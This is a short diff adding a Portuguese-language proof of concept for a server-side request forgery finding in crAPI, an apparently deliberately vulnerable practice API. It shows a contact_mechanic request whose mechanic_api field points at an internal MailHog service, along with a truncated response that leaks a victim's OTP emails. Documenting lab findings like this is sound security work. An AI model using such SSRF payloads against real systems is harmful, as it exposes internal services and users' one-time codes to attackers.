@@ -1,0 +1,10 @@
+# SSRF (API7) — contact_mechanic força o servidor a buscar um destino arbitrário
+# Requisição (mechanic_api aponta para serviço INTERNO, inacessível ao atacante):
+POST http://localhost:8888/workshop/api/merchant/contact_mechanic
+  body: {"mechanic_code":"TRAC_JHN","problem_details":"teste",
+         "mechanic_api":"http://mailhog:8025/api/v2/messages","vin":"...","number_of_repeats":1}
+----------------------------------------------------------------
+# Resposta (trecho):
+{"response_from_mechanic_api":{"total":5,"count":5,"start":0,"items":[{"ID":"q7175SVYUfJfJ9Y3_BBdyjdsq4lZMpr29dEDnzhdV4U=@mailhog.example","From":{"Relays":[],"Mailbox":"no-reply","Domain":"example.com","Params":""},"To":[{"Relays":[],"Mailbox":"vitima","Domain":"teste.local","Params":""}],"Content":{"Headers":{"Content-Transfer-Encoding":["7bit"],"Content-Type":["text/html; charset=us-ascii"],"Date":["Tue, 20 Oct 2026 22:48:11 +0000 (UTC)"],"From":["no-reply@example.com"],"MIME-Version":["1.0"],"Message-ID":["<297415967.4.1792536491774@c1e99983c127>"],"Received":["from c1e99983c127 by mailhog.example (MailHog)\r\n          id q7175SVYUfJfJ9Y3_BBdyjdsq4lZMpr29dEDnzhdV4U=@mailhog.example; Tue, 20 Oct 2026 22:48:11 +0000"],"Return-Path":["<no-reply@example.com>"],"Subject":["crAPI OTP"],"To":["vitima@teste.local"]},"Body":"","Size":517,"MIME":null},"Created":"2026-10-20T22:48:11.777Z","MIME":null,"Raw":{"From":"no-reply@example.com","To":["vitima@teste.local"],"Data":"Date: Tue, 20 Oct 2026 22:48:11 +0000 (UTC)\r\nFrom: no-reply@example.com\r\nTo: vitima@teste.local\r\nMessage-ID: <297415967.4.1792536491774@c1e99983c127>\r\nSubject: crAPI OTP\r\nMIME-Version: 1.0\r\nContent-Type: tex
+----------------------------------------------------------------
+# Prova: 'response_from_mechanic_api' traz o conteúdo do serviço interno (e-mails do MailHog).
